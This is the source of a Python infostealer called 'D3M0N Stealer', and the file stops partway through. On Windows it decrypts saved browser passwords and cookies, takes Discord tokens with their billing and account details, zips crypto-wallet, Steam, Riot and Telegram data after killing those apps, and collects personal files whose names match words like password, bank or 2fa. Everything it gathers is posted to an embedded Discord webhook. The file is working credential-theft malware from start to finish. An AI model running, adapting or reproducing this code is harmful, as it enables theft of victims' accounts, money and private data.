import contextlib
import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads#, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
import shutil

webhook = "https://discord.com/api/webhooks/1106574533298753678/r8KPn-xJjyPETdAcXwuei7IPXDtOyWadQHlAAj3KCkSnv-jx4kNka7PjAowMxgEM6dje"
DETECTED = False

def GetIp():
    ip = "None"
    with contextlib.suppress(Exception):
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]

for module in requirements:
    try: __import__(module[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {module[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []

BadgeList =  [
    {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
    {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
    {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
    {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
    {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
    {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
    {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
    {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
    {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
    {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
]

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts in ['v10', 'v11']:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def LoadRequests(methode, url, data='', files='', headers=''):
    for _ in range(8):
        with contextlib.suppress(Exception):
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code in {200, 413}: # 413 = DATA TO BIG
                        return r

def LoadUrlib(hook, data='', files='', headers=''):
    for _ in range(8):
        with contextlib.suppress(Exception):
            return (
                urlopen(Request(hook, data=data, headers=headers))
                if headers != ''
                else urlopen(Request(hook, data=data))
            )

def GlobalInfo():
    ip = GetIp()
    username = os.getenv("USERNAME")
    ipdata = loads(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}'))
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    return f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"


def Trust(Cookies):
    # simple Trust Factor system (disabled for the moment)
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    DETECTED = len(tim) < -1
    return DETECTED
        
def GetHQFriends(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        FriendList = loads(urlopen(Request("https://discord.com/api/v8/users/@me/relationships", headers=headers)).read().decode())
    except Exception:
        return False
    HQFriends = ''
    for friend in FriendList:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in BadgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if "House" not in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            HQFriends += f"└─ {OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} `({friend['user']['id']})`\n"
    return HQFriends

def GetHQGuilds(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        GuildList = loads(urlopen(Request("https://discord.com/api/v9/users/@me/guilds", headers=headers)).read().decode())
    except Exception:
        return False
    HQGuilds = ''
    for guild in GuildList:
        admin = True if guild['permissions'] == '4398046511103' else False
        if admin and guild['approximate_member_count'] >= 100:
            owner = "✅" if guild['owner'] else "❌"
            invites = loads(urlopen(Request("https://discord.com/api/v8/guilds/{guild['id']}/invites", headers=headers)).read().decode()).json
            if len(invites) > 0:
                invite = f"https://discord.gg/{invites[0]['code']}"
            else:
                invite = "https://d3mon.pw"
            HQGuilds += f"**{guild['name']} `({guild['id']})`**\n└─ Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n└─ [Join Server!]({invite})"
    return HQGuilds
    
def GetGiftCodes(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        GiftCodeList = loads(urlopen(Request("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)).read().decode())
    except Exception:
        return False
    GiftCodes = ''
    for giftcode in GiftCodeList:
        GiftCodes += f":gift: `{giftcode['promotion']['outbound_title']}`\n└─ :ticket: `{giftcode['code']}`\n\n"
    return GiftCodes

def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except Exception:
        return False
    if billingjson == []: return "```None```"
    billing = "└─ "
    for method in billingjson:
        if method["invalid"] == False:
            if method["type"] == 1:
                billing += ":credit_card:"
            elif method["type"] == 2:
                billing += "<:paypal:1089887930388054026>"
            else:
                billing += ":grey_question:"
    return billing

def GetBadges(flags):
    if flags == 0: return ''
    OwnedBadges = '└─ '
    for Badge in BadgeList:
        if flags // Badge["Value"] != 0:
            OwnedBadges += Badge["Emoji"]
            flags = flags % Badge["Value"]
    return OwnedBadges

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    userjson = loads(urlopen(Request("https://discordapp.com/api/v8/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    userid = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    mfa = userjson["mfa_enabled"]
    nitro = ""
    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<a:DE_BadgeNitro:865242433692762122>"
        elif nitrot == 2:
            nitro = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
        elif nitrot == 3:
            nitro = "-<a:DE_BadgeNitro:865242433692762122>-"
    phone = f'```{userjson["phone"]}```' if "phone" in userjson else "None"
    return username, hashtag, email, userid, pfp, flags, mfa, nitro, phone

def CheckToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v8/users/@me", headers=headers))
        return True
    except Exception:
        return False

def UploadToken(token, path):
    global webhook
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, userid, pfp, flags, mfa, nitro, phone = GetTokenInfo(token)
    if pfp is None:
        pfp = "https://media.discordapp.net/attachments/1106336755885547564/1106560677860085791/Vector-Spy-No-Background.png?width=473&height=473"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{userid}/{pfp}"
    billing = GetBilling(token)
    badges = GetBadges(flags)
    friends = GetHQFriends(token)
    guilds = GetHQGuilds(token)
    giftcodes = GetGiftCodes(token)
    if billing == '└─ ': billing = "```None```"
    if badges == '└─ ': badges = "```None```"
    if friends == '': friends = "```No HQ Friends```"
    if guilds == '': guilds = "```No HQ Guilds```"
    if giftcodes == '': giftcodes = "```No Gift Codes```"
    if not billing: badges, phone, billing = "```🔒```", "```🔒```", "```🔒```"
    if nitro == '' and badges == '': nitro = "```None```"
    data = {
        "content": f'{GlobalInfo()} | `{path}`',
        "embeds": [
            {
            "color": 0,
            "fields": [
                {
                    "name": "<:seks:1078076509727756288> Token:",
                    "value": f"```{token}```\n└─ [Click to Copy!](https://d3mon.pw/copy/{token})",
                    "inline": False
                },
                {
                    "name": "<:blackknife:965102913913516073> Email:",
                    "value": f"```{email}```",
                    "inline": True
                },
                {
                    "name": "<:ablackgun:965087866910834768> Phone:",
                    "value": f"{phone}",
                    "inline": True
                },
                {
                    "name": "<a:blackstardiablo:965328968888750110> IP:",
                    "value": f"```{GetIp()}```",
                    "inline": True
                },
                {
                    "name": "<a:a_reaper:1065497701644513331> 2FA:",
                    "value": f"```{mfa}```",
                    "inline": True
                },
                {
                    "name": "<:dc_blackmod:1098310783697440858> Badges:",
                    "value": f"{nitro}{badges}",
                    "inline": True
                },
                {
                    "name": "<:ablackheart:965087885151854683> Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": "<:blackheartwing:961924268663377930> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                },
                {
                    "name": "<:xxbatstill:1056397768614228060> HQ Guilds:",
                    "value": f"{guilds}",
                    "inline": False
                },
                {
                    "name": "<a:ov_bunny:1065499816790073435> Gift Codes:",
                    "value": f"{giftcodes}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({userid})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "D3M0N Stealer",
                "icon_url": "https://media.discordapp.net/attachments/1106336755885547564/1106560677860085791/Vector-Spy-No-Background.png?width=473&height=473"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://media.discordapp.net/attachments/1106336755885547564/1106560677860085791/Vector-Spy-No-Background.png?width=473&height=473",
        "username": "D3M0N Stealer",
        "attachments": []
        }
    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)

def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    if name == "d3cook":
        rb = ' | '.join(cookieWords)
        if len(rb) > 1000: 
            rrrrr = Reformat(str(cookieWords))
            rb = ' | '.join(rrrrr)
            if rb == '': rb = "```None```"
        data = {
            "content": f"{GlobalInfo()}",
            "embeds": [
                {
                    "title": "D3M0N | Cookies Stealer",
                    "description": f"<a:blackcrown:963551032363847750> **Found:**\n\n{rb}\n\n<:p_sifro_old:948051535353479178> **Data:**\n└─ <a:black1:961921296915107870> • Cookies: **{CookiesCount}**\n└─ <a:0stars:1099393149329231932> • [D3M0N Cookies.txt]({link})",
                    "color": 0,
                    "footer": {
                        "text": "D3M0N Stealer",
                        "icon_url": "https://media.discordapp.net/attachments/1106336755885547564/1106560677860085791/Vector-Spy-No-Background.png?width=473&height=473"
                    }
                }
            ],
            "username": "D3M0N Stealer",
            "avatar_url": "https://media.discordapp.net/attachments/1106336755885547564/1106560677860085791/Vector-Spy-No-Background.png?width=473&height=473",
            "attachments": []
            }
        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
        return

    if name == "d3passw":
        ra = ' | '.join(paswWords)
        if len(ra) > 1000: 
            rrr = Reformat(str(paswWords))
            ra = ' | '.join(rrr)
            if ra == '': ra = "```None```"
        data = {
            "content": f"{GlobalInfo()}",
            "embeds": [
                {
                    "title": "D3M0N | Password Stealer",
                    "description": f"<a:blackcrown:963551032363847750> **Found:**\n\n{ra}\n\n<:p_sifro_old:948051535353479178> **Data:**\n└─ <a:black1:961921296915107870> • Passwords: **{PasswordsCount}**\n└─ <a:0stars:1099393149329231932> • [D3M0N Passwords.txt]({link})",
                    "color": 0,
                    "footer": {
                        "text": "D3M0N Stealer",
                        "icon_url": "https://media.discordapp.net/attachments/1106336755885547564/1106560677860085791/Vector-Spy-No-Background.png?width=473&height=473"
                    }
                }
            ],
            "username": "D3M0N",
            "avatar_url": "https://media.discordapp.net/attachments/1106336755885547564/1106560677860085791/Vector-Spy-No-Background.png?width=473&height=473",
            "attachments": []
            }
        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        if link == '\n': link = "```None```"
        data = {
            "content": f"{GlobalInfo()}",
            "embeds": [
                {
                "color": 0,
                "fields": [
                    {
                    "name": "<a:a_reaper:1065497701644513331> Interesting Files:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "D3M0N | File Stealer"
                },
                "footer": {
                    "text": "D3M0N Stealer",
                    "icon_url": "https://media.discordapp.net/attachments/1106336755885547564/1106560677860085791/Vector-Spy-No-Background.png?width=473&height=473"
                }
                }
            ],
            "username": "D3M0N Stealer",
            "avatar_url": "https://media.discordapp.net/attachments/1106336755885547564/1106560677860085791/Vector-Spy-No-Background.png?width=473&height=473",
            "attachments": []
            }
        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
        return

def WriteForFile(data, name):
    path = os.getenv("TEMP") + f"\d3{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<-- ^ D3M0N STEALER ^ -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

Tokens = ''
def GetToken(path, arg):
    if not os.path.exists(path): return
    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if CheckToken(token) and token not in Tokens:
                            # print(token)
                            Tokens += token
                            UploadToken(token, path)

Passwords = []
def GetPasswords(path, arg):
    global Passwords, PasswordsCount
    if not os.path.exists(path): return
    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return
    tempfold = (
        f"{temp}d3"
        + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
        + ".db"
    )

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = f"{path}/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0] and old not in paswWords:
                    paswWords.append(old)
            Passwords.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
            PasswordsCount += 1
    WriteForFile(Passwords, 'passw')

Cookies = []    
def GetCookies(path, arg):
    global Cookies, CookiesCount
    if not os.path.exists(path): return
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    tempfold = (
        f"{temp}d3"
        + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
        + ".db"
    )
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = f"{path}/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0] and old not in cookieWords:
                    cookieWords.append(old)
            Cookies.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{DecryptValue(row[2], master_key)}")
            CookiesCount += 1
    WriteForFile(Cookies, 'cook')

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return
    pathC = path + arg
    pathKey = f"{path}/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if CheckToken(tokenDecoded) and tokenDecoded not in Tokens:
                        Tokens += tokenDecoded
                        UploadToken(tokenDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)
    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)
    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
    wal, ga, ot = '','',''
    if len(WalletsZip) != 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if len(GamingZip) != 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if len(OtherZip) != 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"       
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    if wal == '': wal = ":coin:  •  Wallets\n└─ `None`"
    if ga == '': ga = ":video_game:  •  Gaming:\n└─ `None`"
    if ot == '': ot = ":tickets:  •  Apps\n└─ `None`"
    data = {
        "content": GlobalInfo(),
        "embeds": [
            {
            "title": "D3M0N | Zip Stealer",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 0,
            "footer": {
                "text": "D3M0N Stealer",
                "icon_url": "https://media.discordapp.net/attachments/1106336755885547564/1106560677860085791/Vector-Spy-No-Background.png?width=473&height=473"
            }
            }
        ],
        "username": "D3M0N Stealer",
        "avatar_url": "https://media.discordapp.net/attachments/1106336755885547564/1106560677860085791/Vector-Spy-No-Background.png?width=473&height=473",
        "attachments": []
    }
    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if (
            ".zip" not in file
            and "tdummy" not in file
            and "user_data" not in file
            and "webview" not in file
        ): 
            zf.write(f"{pathC}/{file}")
    zf.close()
    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")
    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"
    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        found = any('RememberPassword"\t\t"1"' in l for l in data)
        if not found: return
        name = arg
    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if ".zip" not in file:
            zf.write(f"{pathC}/{file}")
    zf.close()
    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])

def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]
    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]
    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
    for patt in browserPaths: 
        a = threading.Thread(target=GetToken, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)
    for patt in browserPaths: 
        a = threading.Thread(target=GetPasswords, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)
    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=GetCookies, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)
    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()

    for thread in ThCokk: thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True: return
    for patt in browserPaths:
         threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
    
    for patt in PathsToZip:
         threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
    
    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()
    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []
    for file in ["d3passw.txt", "d3cook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return #requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(f"{pathF}/{file}"): return
        i += 1
        if i > maxfilesperdir:
            break
        url = uploadToAnonfiles(f"{pathF}/{file}")
        ffound.append([f"{pathF}/{file}", url])
    KiwiFiles.append(["folder", f"{pathF}/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(f"{path}/{file}") and ".txt" in file:
                    fifound.append([f"{path}/{file}", uploadToAnonfiles(f"{path}/{file}")])
                    break
                if os.path.isdir(f"{path}/{file}"):
                    target = f"{path}/{file}"
                    KiwiFolder(target, keywords)
                    break
    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [f"{user}/Desktop", f"{user}/Downloads", f"{user}/Documents"]
    key_wordsFolder = [
        "pass",
        "Pass",
        "info",
        "Info",
        "aov",
        "AOV",
        "login",
        "Login",
        "secret",
        "Secret",
        "account",
        "Account",
        "paypal",
        "Paypal",
        "PayPal",
        "bank",
        "Bank",
        "metamask",
        "Metamask",
        "MetaMask",
        "wallet",
        "Wallet",
        "crypto",
        "Crypto",
        "exodus",
        "Exodus",
        "discord",
        "Discord",
        "2fa",
        "2FA",
        "mfa",
        "MFA",
        "code",
        "Code",
        "token",
        "Token",
        "backup",
        "Backup"
    ]
    key_wordsFiles = [
        "pass",
        "Pass",
        "info",
        "Info",
        "aov",
        "AOV",
        "login",
        "Login",
        "secret",
        "Secret",
        "account",
        "Account",
        "paypal",
        "Paypal",
        "PayPal",
        "bank",
        "Bank",
        "metamask",
        "Metamask",
        "MetaMask",
        "wallet",
        "Wallet",
        "crypto",
        "Crypto",
        "exodus",
        "Exodus",
        "discord",
        "Discord",
        "2fa",
        "2FA",
        "mfa",
        "MFA",
        "code",
        "Code",
        "token",
        "Token",
        "backup",
        "Backup"
        ]
    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith

global keyword, cookieWords, paswWords, CookiesCount, PasswordsCount, WalletsZip, GamingZip, OtherZip

keyword = [
